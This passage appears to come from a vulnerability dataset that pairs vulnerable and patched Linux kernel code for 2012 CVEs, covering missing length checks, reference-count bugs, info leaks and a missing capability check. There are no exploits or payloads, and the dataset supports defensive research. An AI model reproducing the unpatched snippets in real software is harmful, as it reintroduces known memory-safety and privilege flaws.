 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;
 rcu_read_unlock();
	rt = ip_route_output_ports(sock_net(sk), sk, daddr, inet->inet_saddr,
				   inet->inet_dport, inet->inet_sport,
				   sk->sk_protocol, RT_CONN_FLAGS(sk),
"
2012,,CVE-2012-3520,"}

static __inline__ int scm_send(struct socket *sock, struct msghdr *msg,
 struct scm_cookie *scm)
{
 memset(scm, 0, sizeof(*scm));


 unix_get_peersec_dgram(sock, scm);
 if (msg->msg_controllen <= 0)
 return 0;
 if (NULL == siocb->scm)
		siocb->scm = &scm;

	err = scm_send(sock, msg, siocb->scm);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm);
 if (err < 0)
 return err;

","}

static __inline__ int scm_send(struct socket *sock, struct msghdr *msg,
 struct scm_cookie *scm, bool forcecreds)
{
 memset(scm, 0, sizeof(*scm));
 if (forcecreds)
 scm_set_cred(scm, task_tgid(current), current_cred());
 unix_get_peersec_dgram(sock, scm);
 if (msg->msg_controllen <= 0)
 return 0;
 if (NULL == siocb->scm)
		siocb->scm = &scm;

	err = scm_send(sock, msg, siocb->scm, true);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm, false);
 if (err < 0)
 return err;

 if (NULL == siocb->scm)
		siocb->scm = &tmp_scm;
 wait_for_unix_gc();
	err = scm_send(sock, msg, siocb->scm, false);
 if (err < 0)
 return err;

"
2012,DoS ,CVE-2012-3511,"#include <linux/sched.h>
#include <linux/ksm.h>
#include <linux/fs.h>


/*
 * Any behaviour which results in changes to the vma->vm_flags needs to
{
 loff_t offset;
 int error;


	*prev = NULL;	/* tell sys_madvise we drop mmap_sem */

 if (vma->vm_flags & (VM_LOCKED|VM_NONLINEAR|VM_HUGETLB))
 return -EINVAL;

 if (!vma->vm_file || !vma->vm_file->f_mapping
		|| !vma->vm_file->f_mapping->host) {

 return -EINVAL;
	}

	offset = (loff_t)(start - vma->vm_start)
			+ ((loff_t)vma->vm_pgoff << PAGE_SHIFT);

 /* filesystem's fallocate may need to take i_mutex */






 up_read(&current->mm->mmap_sem);
	error = do_fallocate(vma->vm_file,
				FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
				offset, end - start);

 down_read(&current->mm->mmap_sem);
 return error;
}
","#include <linux/sched.h>
#include <linux/ksm.h>
#include <linux/fs.h>
#include <linux/file.h>

/*
 * Any behaviour which results in changes to the vma->vm_flags needs to
{
 loff_t offset;
 int error;
 struct file *f;

	*prev = NULL;	/* tell sys_madvise we drop mmap_sem */

 if (vma->vm_flags & (VM_LOCKED|VM_NONLINEAR|VM_HUGETLB))
 return -EINVAL;

	f = vma->vm_file;

 if (!f || !f->f_mapping || !f->f_mapping->host) {
 return -EINVAL;
	}

	offset = (loff_t)(start - vma->vm_start)
			+ ((loff_t)vma->vm_pgoff << PAGE_SHIFT);

 /*
	 * Filesystem's fallocate may need to take i_mutex.  We need to
	 * explicitly grab a reference because the vma (and hence the
	 * vma's reference to the file) can go away as soon as we drop
	 * mmap_sem.
 */
 get_file(f);
 up_read(&current->mm->mmap_sem);
	error = do_fallocate(f,
				FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
				offset, end - start);
 fput(f);
 down_read(&current->mm->mmap_sem);
 return error;
}
"
2012,DoS +Info ,CVE-2012-3510," */
void xacct_add_tsk(struct taskstats *stats, struct task_struct *p)
{


 /* convert pages-jiffies to Mbyte-usec */
	stats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;
	stats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;
 if (p->mm) {

 /* adjust to KB unit */
		stats->hiwater_rss   = p->mm->hiwater_rss * PAGE_SIZE / KB;
		stats->hiwater_vm    = p->mm->hiwater_vm * PAGE_SIZE / KB;

	}
	stats->read_char	= p->rchar;
	stats->write_char	= p->wchar;
"," */
void xacct_add_tsk(struct taskstats *stats, struct task_struct *p)
{
 struct mm_struct *mm;

 /* convert pages-jiffies to Mbyte-usec */
	stats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;
	stats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;
	mm = get_task_mm(p);
 if (mm) {
 /* adjust to KB unit */
		stats->hiwater_rss   = mm->hiwater_rss * PAGE_SIZE / KB;
		stats->hiwater_vm    = mm->hiwater_vm * PAGE_SIZE / KB;
 mmput(mm);
	}
	stats->read_char	= p->rchar;
	stats->write_char	= p->wchar;
"
2012,#NAME?,CVE-2012-3430,"
 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

 sin->sin_port = inc->i_hdr.h_sport;
 sin->sin_addr.s_addr = inc->i_saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));

		}
 break;
	}
","
 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

 sin->sin_port = inc->i_hdr.h_sport;
 sin->sin_addr.s_addr = inc->i_saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
			msg->msg_namelen = sizeof(*sin);
		}
 break;
	}
"
2012,DoS ,CVE-2012-3412," goto fail2;
	}






	efx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;
	rc = efx_probe_channels(efx);
 if (rc)
	net_dev->irq = efx->pci_dev->irq;
	net_dev->netdev_ops = &efx_netdev_ops;
 SET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);


 /* Clear MAC statistics */
	efx->mac_op->update_stats(efx);
efx_enqueue_skb(struct efx_tx_queue *tx_queue, struct sk_buff *skb);
extern void efx_xmit_done(struct efx_tx_queue *tx_queue, unsigned int index);
extern int efx_setup_tc(struct net_device *net_dev, u8 num_tc);


/* RX */
extern int efx_probe_rx_queue(struct efx_rx_queue *rx_queue);
#define EFX_MAX_EVQ_SIZE 16384UL
#define EFX_MIN_EVQ_SIZE 512UL

/* The smallest [rt]xq_entries that the driver supports. Callers of
 * efx_wake_queue() assume that they can subsequently send at least one
 * skb. Falcon/A1 may require up to three descriptors per skb_frag. */
#define EFX_MIN_RING_SIZE (roundup_pow_of_two(2 * 3 * MAX_SKB_FRAGS))






/* Filters */
extern int efx_probe_filters(struct efx_nic *efx);
 struct ethtool_ringparam *ring)
{
 struct efx_nic *efx = netdev_priv(net_dev);


 if (ring->rx_mini_pending || ring->rx_jumbo_pending ||
	    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||
	    ring->tx_pending > EFX_MAX_DMAQ_SIZE)
 return -EINVAL;

 if (ring->rx_pending < EFX_MIN_RING_SIZE ||
	    ring->tx_pending < EFX_MIN_RING_SIZE) {
 netif_err(efx, drv, efx->net_dev,
 ""TX and RX queues cannot be smaller than %ld\n"",
 EFX_MIN_RING_SIZE);
 return -EINVAL;
	}

 return efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);






}

static int efx_ethtool_set_pauseparam(struct net_device *net_dev,
#define FALCON_GMAC_LOOPBACKS			\
	(1 << LOOPBACK_GMAC)




/**
 * struct falcon_board_type - board operations and type information
 * @id: Board type id, as found in NVRAM
 return len;
}




















/*
 * Add a socket buffer to a TX queue
 *
"," goto fail2;
	}

 BUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);
 if (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {
		rc = -EINVAL;
 goto fail3;
	}
	efx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;
	rc = efx_probe_channels(efx);
 if (rc)
	net_dev->irq = efx->pci_dev->irq;
	net_dev->netdev_ops = &efx_netdev_ops;
 SET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);
	net_dev->gso_max_segs = EFX_TSO_MAX_SEGS;

 /* Clear MAC statistics */
	efx->mac_op->update_stats(efx);
efx_enqueue_skb(struct efx_tx_queue *tx_queue, struct sk_buff *skb);
extern void efx_xmit_done(struct efx_tx_queue *tx_queue, unsigned int index);
extern int efx_setup_tc(struct net_device *net_dev, u8 num_tc);
extern unsigned int efx_tx_max_skb_descs(struct efx_nic *efx);

/* RX */
extern int efx_probe_rx_queue(struct efx_rx_queue *rx_queue);
#define EFX_MAX_EVQ_SIZE 16384UL
#define EFX_MIN_EVQ_SIZE 512UL

/* Maximum number of TCP segments we support for soft-TSO */
#define EFX_TSO_MAX_SEGS 100

/* The smallest [rt]xq_entries that the driver supports.  RX minimum
 * is a bit arbitrary.  For TX, we must have space for at least 2
 * TSO skbs.
 */
#define EFX_RXQ_MIN_ENT 128U
#define EFX_TXQ_MIN_ENT(efx)	(2 * efx_tx_max_skb_descs(efx))

/* Filters */
extern int efx_probe_filters(struct efx_nic *efx);
 struct ethtool_ringparam *ring)
{
 struct efx_nic *efx = netdev_priv(net_dev);
	u32 txq_entries;

 if (ring->rx_mini_pending || ring->rx_jumbo_pending ||
	    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||
	    ring->tx_pending > EFX_MAX_DMAQ_SIZE)
 return -EINVAL;

 if (ring->rx_pending < EFX_RXQ_MIN_ENT) {

 netif_err(efx, drv, efx->net_dev,
 ""RX queues cannot be smaller than %u\n"",
 EFX_RXQ_MIN_ENT);
 return -EINVAL;
	}

	txq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));
 if (txq_entries != ring->tx_pending)
 netif_warn(efx, drv, efx->net_dev,
 ""increasing TX queue size to minimum of %u\n"",
			   txq_entries);

 return efx_realloc_channels(efx, ring->rx_pending, txq_entries);
}

static int efx_ethtool_set_pauseparam(struct net_device *net_dev,
#define FALCON_GMAC_LOOPBACKS			\
	(1 << LOOPBACK_GMAC)

/* Alignment of PCIe DMA boundaries (4KB) */
#define EFX_PAGE_SIZE 4096

/**
 * struct falcon_board_type - board operations and type information
 * @id: Board type id, as found in NVRAM
 return len;
}

unsigned int efx_tx_max_skb_descs(struct efx_nic *efx)
{
 /* Header and payload descriptor for each output segment, plus
	 * one for every input fragment boundary within a segment
 */
 unsigned int max_descs = EFX_TSO_MAX_SEGS * 2 + MAX_SKB_FRAGS;

 /* Possibly one more per segment for the alignment workaround */
 if (EFX_WORKAROUND_5391(efx))
		max_descs += EFX_TSO_MAX_SEGS;

 /* Possibly more for PCIe page boundaries within input fragments */
 if (PAGE_SIZE > EFX_PAGE_SIZE)
		max_descs += max_t(unsigned int, MAX_SKB_FRAGS,
 DIV_ROUND_UP(GSO_MAX_SIZE, EFX_PAGE_SIZE));

 return max_descs;
}

/*
 * Add a socket buffer to a TX queue
 *
"
2012,DoS Overflow ,CVE-2012-3400," struct genericPartitionMap *gpm;
 uint16_t ident;
 struct buffer_head *bh;

 int ret = 0;

	bh = udf_read_tagged(sb, block, block, &ident);
 if (!bh)
 return 1;
 BUG_ON(ident != TAG_IDENT_LVD);
	lvd = (struct logicalVolDesc *)bh->b_data;








	ret = udf_sb_alloc_partition_maps(sb, le32_to_cpu(lvd->numPartitionMaps));
 if (ret)
 goto out_bh;

 for (i = 0, offset = 0;
	     i < sbi->s_partitions && offset < le32_to_cpu(lvd->mapTableLength);
	     i++, offset += gpm->partitionMapLength) {
 struct udf_part_map *map = &sbi->s_partmaps[i];
		gpm = (struct genericPartitionMap *)
"," struct genericPartitionMap *gpm;
 uint16_t ident;
 struct buffer_head *bh;
 unsigned int table_len;
 int ret = 0;

	bh = udf_read_tagged(sb, block, block, &ident);
 if (!bh)
 return 1;
 BUG_ON(ident != TAG_IDENT_LVD);
	lvd = (struct logicalVolDesc *)bh->b_data;
	table_len = le32_to_cpu(lvd->mapTableLength);
 if (sizeof(*lvd) + table_len > sb->s_blocksize) {
 udf_err(sb, ""error loading logical volume descriptor: ""
 ""Partition table too long (%u > %lu)\n"", table_len,
			sb->s_blocksize - sizeof(*lvd));
 goto out_bh;
	}

	ret = udf_sb_alloc_partition_maps(sb, le32_to_cpu(lvd->numPartitionMaps));
 if (ret)
 goto out_bh;

 for (i = 0, offset = 0;
	     i < sbi->s_partitions && offset < table_len;
	     i++, offset += gpm->partitionMapLength) {
 struct udf_part_map *map = &sbi->s_partmaps[i];
		gpm = (struct genericPartitionMap *)
"
2012,DoS ,CVE-2012-3375," if (op == EPOLL_CTL_ADD) {
 if (is_file_epoll(tfile)) {
			error = -ELOOP;
 if (ep_loop_check(ep, tfile) != 0)

 goto error_tgt_fput;

		} else
 list_add(&tfile->f_tfile_llink, &tfile_check_list);
	}
"," if (op == EPOLL_CTL_ADD) {
 if (is_file_epoll(tfile)) {
			error = -ELOOP;
 if (ep_loop_check(ep, tfile) != 0) {
 clear_tfile_check_list();
 goto error_tgt_fput;
			}
		} else
 list_add(&tfile->f_tfile_llink, &tfile_check_list);
	}
"
2013,DoS Exec Code Overflow ,CVE-2012-3364,"	nfca_poll->sens_res = __le16_to_cpu(*((__u16 *)data));
	data += 2;

	nfca_poll->nfcid1_len = *data++;

 pr_debug(""sens_res 0x%x, nfcid1_len %d\n"",
		 nfca_poll->sens_res, nfca_poll->nfcid1_len);
 struct rf_tech_specific_params_nfcb_poll *nfcb_poll,
						     __u8 *data)
{
	nfcb_poll->sensb_res_len = *data++;

 pr_debug(""sensb_res_len %d\n"", nfcb_poll->sensb_res_len);

						     __u8 *data)
{
	nfcf_poll->bit_rate = *data++;
	nfcf_poll->sensf_res_len = *data++;

 pr_debug(""bit_rate %d, sensf_res_len %d\n"",
		 nfcf_poll->bit_rate, nfcf_poll->sensf_res_len);
 switch (ntf->activation_rf_tech_and_mode) {
 case NCI_NFC_A_PASSIVE_POLL_MODE:
		nfca_poll = &ntf->activation_params.nfca_poll_iso_dep;
		nfca_poll->rats_res_len = *data++;
 pr_debug(""rats_res_len %d\n"", nfca_poll->rats_res_len);
 if (nfca_poll->rats_res_len > 0) {
 memcpy(nfca_poll->rats_res,

 case NCI_NFC_B_PASSIVE_POLL_MODE:
		nfcb_poll = &ntf->activation_params.nfcb_poll_iso_dep;
		nfcb_poll->attrib_res_len = *data++;
 pr_debug(""attrib_res_len %d\n"", nfcb_poll->attrib_res_len);
 if (nfcb_poll->attrib_res_len > 0) {
 memcpy(nfcb_poll->attrib_res,
","	nfca_poll->sens_res = __le16_to_cpu(*((__u16 *)data));
	data += 2;

	nfca_poll->nfcid1_len = min_t(__u8, *data++, NFC_NFCID1_MAXSIZE);

 pr_debug(""sens_res 0x%x, nfcid1_len %d\n"",
		 nfca_poll->sens_res, nfca_poll->nfcid1_len);
 struct rf_tech_specific_params_nfcb_poll *nfcb_poll,
						     __u8 *data)
{
	nfcb_poll->sensb_res_len = min_t(__u8, *data++, NFC_SENSB_RES_MAXSIZE);

 pr_debug(""sensb_res_len %d\n"", nfcb_poll->sensb_res_len);

						     __u8 *data)
{
	nfcf_poll->bit_rate = *data++;
	nfcf_poll->sensf_res_len = min_t(__u8, *data++, NFC_SENSF_RES_MAXSIZE);

 pr_debug(""bit_rate %d, sensf_res_len %d\n"",
		 nfcf_poll->bit_rate, nfcf_poll->sensf_res_len);
 switch (ntf->activation_rf_tech_and_mode) {
 case NCI_NFC_A_PASSIVE_POLL_MODE:
		nfca_poll = &ntf->activation_params.nfca_poll_iso_dep;
		nfca_poll->rats_res_len = min_t(__u8, *data++, 20);
 pr_debug(""rats_res_len %d\n"", nfca_poll->rats_res_len);
 if (nfca_poll->rats_res_len > 0) {
 memcpy(nfca_poll->rats_res,

 case NCI_NFC_B_PASSIVE_POLL_MODE:
		nfcb_poll = &ntf->activation_params.nfcb_poll_iso_dep;
		nfcb_poll->attrib_res_len = min_t(__u8, *data++, 50);
 pr_debug(""attrib_res_len %d\n"", nfcb_poll->attrib_res_len);
 if (nfcb_poll->attrib_res_len > 0) {
 memcpy(nfcb_poll->attrib_res,
"
2012,DoS Overflow ,CVE-2012-2745," struct cred *new;
 int ret;



 if (
#ifdef CONFIG_KEYS
		!p->cred->thread_keyring &&
"," struct cred *new;
 int ret;

	p->replacement_session_keyring = NULL;

 if (
#ifdef CONFIG_KEYS
		!p->cred->thread_keyring &&
"
2012,DoS ,CVE-2012-2744,"
 /* all original skbs are linked into the NFCT_FRAG6_CB(head).orig */
	fp = skb_shinfo(head)->frag_list;
 if (NFCT_FRAG6_CB(fp)->orig == NULL)
 /* at above code, head skb is divided into two skbs. */
		fp = fp->next;

	hdr = ipv6_hdr(clone);
	fhdr = (struct frag_hdr *)skb_transport_header(clone);

 if (!(fhdr->frag_off & htons(0xFFF9))) {
 pr_debug(""Invalid fragment offset\n"");
 /* It is not a fragmented frame */
 goto ret_orig;
	}

 if (atomic_read(&nf_init_frags.mem) > nf_init_frags.high_thresh)
 nf_ct_frag6_evictor();

","
 /* all original skbs are linked into the NFCT_FRAG6_CB(head).orig */
	fp = skb_shinfo(head)->frag_list;
 if (fp && NFCT_FRAG6_CB(fp)->orig == NULL)
 /* at above code, head skb is divided into two skbs. */
		fp = fp->next;

	hdr = ipv6_hdr(clone);
	fhdr = (struct frag_hdr *)skb_transport_header(clone);







 if (atomic_read(&nf_init_frags.mem) > nf_init_frags.high_thresh)
 nf_ct_frag6_evictor();

"
2012,,CVE-2012-2669,"	pfd.fd = fd;

 while (1) {


		pfd.events = POLLIN;
		pfd.revents = 0;
 poll(&pfd, 1, -1);

		len = recv(fd, kvp_recv_buffer, sizeof(kvp_recv_buffer), 0);


 if (len < 0) {
 syslog(LOG_ERR, ""recv failed; error:%d"", len);

 close(fd);
 return -1;
		}
","	pfd.fd = fd;

 while (1) {
 struct sockaddr *addr_p = (struct sockaddr *) &addr;
 socklen_t addr_l = sizeof(addr);
		pfd.events = POLLIN;
		pfd.revents = 0;
 poll(&pfd, 1, -1);

		len = recvfrom(fd, kvp_recv_buffer, sizeof(kvp_recv_buffer), 0,
				addr_p, &addr_l);

 if (len < 0 || addr.nl_pid) {
 syslog(LOG_ERR, ""recvfrom failed; pid:%u error:%d %s"",
					addr.nl_pid, errno, strerror(errno));
 close(fd);
 return -1;
		}
"
2012,DoS ,CVE-2012-2390," kref_get(&reservations->refs);
}










static void hugetlb_vm_op_close(struct vm_area_struct *vma)
{
 struct hstate *h = hstate_vma(vma);
		reserve = (end - start) -
 region_count(&reservations->regions, start, end);

 kref_put(&reservations->refs, resv_map_release);

 if (reserve) {
 hugetlb_acct_memory(h, -reserve);
 set_vma_resv_flags(vma, HPAGE_RESV_OWNER);
	}

 if (chg < 0)
 return chg;



 /* There must be enough pages in the subpool for the mapping */
 if (hugepage_subpool_get_pages(spool, chg))
 return -ENOSPC;



 /*
	 * Check enough hugepages are available for the reservation.
	ret = hugetlb_acct_memory(h, chg);
 if (ret < 0) {
 hugepage_subpool_put_pages(spool, chg);
 return ret;
	}

 /*
 if (!vma || vma->vm_flags & VM_MAYSHARE)
 region_add(&inode->i_mapping->private_list, from, to);
 return 0;



}

void hugetlb_unreserve_pages(struct inode *inode, long offset, long freed)
"," kref_get(&reservations->refs);
}

static void resv_map_put(struct vm_area_struct *vma)
{
 struct resv_map *reservations = vma_resv_map(vma);

 if (!reservations)
 return;
 kref_put(&reservations->refs, resv_map_release);
}

static void hugetlb_vm_op_close(struct vm_area_struct *vma)
{
 struct hstate *h = hstate_vma(vma);
		reserve = (end - start) -
 region_count(&reservations->regions, start, end);

 resv_map_put(vma);

 if (reserve) {
 hugetlb_acct_memory(h, -reserve);
 set_vma_resv_flags(vma, HPAGE_RESV_OWNER);
	}

 if (chg < 0) {
		ret = chg;
 goto out_err;
	}

 /* There must be enough pages in the subpool for the mapping */
 if (hugepage_subpool_get_pages(spool, chg)) {
		ret = -ENOSPC;
 goto out_err;
	}

 /*
	 * Check enough hugepages are available for the reservation.
	ret = hugetlb_acct_memory(h, chg);
 if (ret < 0) {
 hugepage_subpool_put_pages(spool, chg);
 goto out_err;
	}

 /*
 if (!vma || vma->vm_flags & VM_MAYSHARE)
 region_add(&inode->i_mapping->private_list, from, to);
 return 0;
out_err:
 resv_map_put(vma);
 return ret;
}

void hugetlb_unreserve_pages(struct inode *inode, long offset, long freed)
"
2012,DoS Overflow ,CVE-2012-2384," return -EINVAL;
		}






		cliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),
				    GFP_KERNEL);
 if (cliprects == NULL) {
"," return -EINVAL;
		}

 if (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {
 DRM_DEBUG(""execbuf with %u cliprects\n"",
				  args->num_cliprects);
 return -EINVAL;
		}
		cliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),
				    GFP_KERNEL);
 if (cliprects == NULL) {
"
2012,DoS Overflow ,CVE-2012-2383," struct drm_i915_gem_exec_object2 *exec2_list = NULL;
 int ret;

 if (args->buffer_count < 1) {

 DRM_DEBUG(""execbuf2 with %d buffers\n"", args->buffer_count);
 return -EINVAL;
	}
"," struct drm_i915_gem_exec_object2 *exec2_list = NULL;
 int ret;

 if (args->buffer_count < 1 ||
	    args->buffer_count > UINT_MAX / sizeof(*exec2_list)) {
 DRM_DEBUG(""execbuf2 with %d buffers\n"", args->buffer_count);
 return -EINVAL;
	}
"
2012,DoS ,CVE-2012-2375," if (acl_len > buflen)
 goto out_free;
 _copy_from_pages(buf, pages, res.acl_data_offset,
 res.acl_len);
	}
	ret = acl_len;
out_free:
"," if (acl_len > buflen)
 goto out_free;
 _copy_from_pages(buf, pages, res.acl_data_offset,
				acl_len);
	}
	ret = acl_len;
out_free:
"
2012,DoS ,CVE-2012-2373,"	ptep->pte_low = pte.pte_low;
}



















































static inline void native_set_pte_atomic(pte_t *ptep, pte_t pte)
{
 set_64bit((unsigned long long *)(ptep), native_pte_val(pte));
#endif /* __HAVE_ARCH_PMD_WRITE */
#endif /* CONFIG_TRANSPARENT_HUGEPAGE */













/*
 * This function is meant to be used by sites walking pagetables with
 * the mmap_sem hold in read mode to protect against MADV_DONTNEED and
 * undefined so behaving like if the pmd was none is safe (because it
 * can return none anyway). The compiler level barrier() is critically
 * important to compute the two checks atomically on the same pmdval.







 */
static inline int pmd_none_or_trans_huge_or_clear_bad(pmd_t *pmd)
{
 /* depend on compiler for an atomic pmd read */
 pmd_t pmdval = *pmd;
 /*
	 * The barrier will stabilize the pmdval in a register or on
	 * the stack so that it will stop changing under the code.
","	ptep->pte_low = pte.pte_low;
}

#define pmd_read_atomic pmd_read_atomic
/*
 * pte_offset_map_lock on 32bit PAE kernels was reading the pmd_t with
 * a ""*pmdp"" dereference done by gcc. Problem is, in certain places
 * where pte_offset_map_lock is called, concurrent page faults are
 * allowed, if the mmap_sem is hold for reading. An example is mincore
 * vs page faults vs MADV_DONTNEED. On the page fault side
 * pmd_populate rightfully does a set_64bit, but if we're reading the
 * pmd_t with a ""*pmdp"" on the mincore side, a SMP race can happen
 * because gcc will not read the 64bit of the pmd atomically. To fix
 * this all places running pmd_offset_map_lock() while holding the
 * mmap_sem in read mode, shall read the pmdp pointer using this
 * function to know if the pmd is null nor not, and in turn to know if
 * they can run pmd_offset_map_lock or pmd_trans_huge or other pmd
 * operations.
 *
 * Without THP if the mmap_sem is hold for reading, the
 * pmd can only transition from null to not null while pmd_read_atomic runs.
 * So there's no need of literally reading it atomically.
 *
 * With THP if the mmap_sem is hold for reading, the pmd can become
 * THP or null or point to a pte (and in turn become ""stable"") at any
 * time under pmd_read_atomic, so it's mandatory to read it atomically
 * with cmpxchg8b.
 */
#ifndef CONFIG_TRANSPARENT_HUGEPAGE
static inline pmd_t pmd_read_atomic(pmd_t *pmdp)
{
 pmdval_t ret;
	u32 *tmp = (u32 *)pmdp;

	ret = (pmdval_t) (*tmp);
 if (ret) {
 /*
		 * If the low part is null, we must not read the high part
		 * or we can end up with a partial pmd.
 */
 smp_rmb();
		ret |= ((pmdval_t)*(tmp + 1)) << 32;
	}

 return (pmd_t) { ret };
}
#else /* CONFIG_TRANSPARENT_HUGEPAGE */
static inline pmd_t pmd_read_atomic(pmd_t *pmdp)
{
 return (pmd_t) { atomic64_read((atomic64_t *)pmdp) };
}
#endif /* CONFIG_TRANSPARENT_HUGEPAGE */

static inline void native_set_pte_atomic(pte_t *ptep, pte_t pte)
{
 set_64bit((unsigned long long *)(ptep), native_pte_val(pte));
#endif /* __HAVE_ARCH_PMD_WRITE */
#endif /* CONFIG_TRANSPARENT_HUGEPAGE */

#ifndef pmd_read_atomic
static inline pmd_t pmd_read_atomic(pmd_t *pmdp)
{
 /*
	 * Depend on compiler for an atomic pmd read. NOTE: this is
	 * only going to work, if the pmdval_t isn't larger than
	 * an unsigned long.
 */
 return *pmdp;
}
#endif

/*
 * This function is meant to be used by sites walking pagetables with
 * the mmap_sem hold in read mode to protect against MADV_DONTNEED and
 * undefined so behaving like if the pmd was none is safe (because it
 * can return none anyway). The compiler level barrier() is critically
 * important to compute the two checks atomically on the same pmdval.
 *
 * For 32bit kernels with a 64bit large pmd_t this automatically takes
 * care of reading the pmd atomically to avoid SMP race conditions
 * against pmd_populate() when the mmap_sem is hold for reading by the
 * caller (a special atomic read not done by ""gcc"" as in the generic
 * version above, is also needed when THP is disabled because the page
 * fault can populate the pmd from under us).
 */
static inline int pmd_none_or_trans_huge_or_clear_bad(pmd_t *pmd)
{
 pmd_t pmdval = pmd_read_atomic(pmd);

 /*
	 * The barrier will stabilize the pmdval in a register or on
	 * the stack so that it will stop changing under the code.
"
2013,DoS ,CVE-2012-2372,,
2012,Overflow +Priv ,CVE-2012-2319,"	err = hfs_brec_find(&src_fd);
 if (err)
 goto out;





 hfs_bnode_read(src_fd.bnode, &entry, src_fd.entryoffset,
				src_fd.entrylength);
		filp->f_pos++;
 /* fall through */
 case 1:





 hfs_bnode_read(fd.bnode, &entry, fd.entryoffset,
			fd.entrylength);
 if (be16_to_cpu(entry.type) != HFSPLUS_FOLDER_THREAD) {
			err = -EIO;
 goto out;
		}






 hfs_bnode_read(fd.bnode, &entry, fd.entryoffset,
			fd.entrylength);
		type = be16_to_cpu(entry.type);
","	err = hfs_brec_find(&src_fd);
 if (err)
 goto out;
 if (src_fd.entrylength > sizeof(entry) || src_fd.entrylength < 0) {
		err = -EIO;
 goto out;
	}

 hfs_bnode_read(src_fd.bnode, &entry, src_fd.entryoffset,
				src_fd.entrylength);
		filp->f_pos++;
 /* fall through */
 case 1:
 if (fd.entrylength > sizeof(entry) || fd.entrylength < 0) {
			err = -EIO;
 goto out;
		}

 hfs_bnode_read(fd.bnode, &entry, fd.entryoffset,
			fd.entrylength);
 if (be16_to_cpu(entry.type) != HFSPLUS_FOLDER_THREAD) {
			err = -EIO;
 goto out;
		}

 if (fd.entrylength > sizeof(entry) || fd.entrylength < 0) {
			err = -EIO;
 goto out;
		}

 hfs_bnode_read(fd.bnode, &entry, fd.entryoffset,
			fd.entrylength);
		type = be16_to_cpu(entry.type);
"
2012,,CVE-2012-2313,"{
 int phy_addr;
 struct netdev_private *np = netdev_priv(dev);
 struct mii_data *miidata = (struct mii_data *) &rq->ifr_ifru;

 struct netdev_desc *desc;
 int i;

	phy_addr = np->phy_addr;
 switch (cmd) {
 case SIOCDEVPRIVATE:
 break;

 case SIOCDEVPRIVATE + 1:
		miidata->out_value = mii_read (dev, phy_addr, miidata->reg_num);
 break;
 case SIOCDEVPRIVATE + 2:
 mii_write (dev, phy_addr, miidata->reg_num, miidata->in_value);
 break;
 case SIOCDEVPRIVATE + 3:
 break;
 case SIOCDEVPRIVATE + 4:
 break;
 case SIOCDEVPRIVATE + 5:
 netif_stop_queue (dev);
 break;
 case SIOCDEVPRIVATE + 6:
 netif_wake_queue (dev);
 break;
 case SIOCDEVPRIVATE + 7:
		printk
		    (""tx_full=%x cur_tx=%lx old_tx=%lx cur_rx=%lx old_rx=%lx\n"",
 netif_queue_stopped(dev), np->cur_tx, np->old_tx, np->cur_rx,
		     np->old_rx);
 break;
 case SIOCDEVPRIVATE + 8:
 printk(""TX ring:\n"");
 for (i = 0; i < TX_RING_SIZE; i++) {
			desc = &np->tx_ring[i];
			printk
			    (""%02x:cur:%08x next:%08x status:%08x frag1:%08x frag0:%08x"",
			     i,
			     (u32) (np->tx_ring_dma + i * sizeof (*desc)),
			     (u32)le64_to_cpu(desc->next_desc),
			     (u32)le64_to_cpu(desc->status),
			     (u32)(le64_to_cpu(desc->fraginfo) >> 32),
			     (u32)le64_to_cpu(desc->fraginfo));
 printk (""\n"");
		}
 printk (""\n"");
 break;

 default:
 return -EOPNOTSUPP;
	}
 char *data;
};

struct mii_data {
	__u16 reserved;
	__u16 reg_num;
	__u16 in_value;
	__u16 out_value;
};

/* The Rx and Tx buffer descriptors. */
struct netdev_desc {
	__le64 next_desc;
","{
 int phy_addr;
 struct netdev_private *np = netdev_priv(dev);
 struct mii_ioctl_data *miidata = if_mii(rq);




	phy_addr = np->phy_addr;
 switch (cmd) {
 case SIOCGMIIPHY:
		miidata->phy_id = phy_addr;



 break;
 case SIOCGMIIREG:
 miidata->val_out = mii_read (dev, phy_addr, miidata->reg_num);
 break;
 case SIOCSMIIREG:
 if (!capable(CAP_NET_ADMIN))
 return -EPERM;
 mii_write (dev, phy_addr, miidata->reg_num, miidata->val_in);


 break;


























 default:
 return -EOPNOTSUPP;
	}
 char *data;
};








/* The Rx and Tx buffer descriptors. */
struct netdev_desc {
	__le64 next_desc;
"
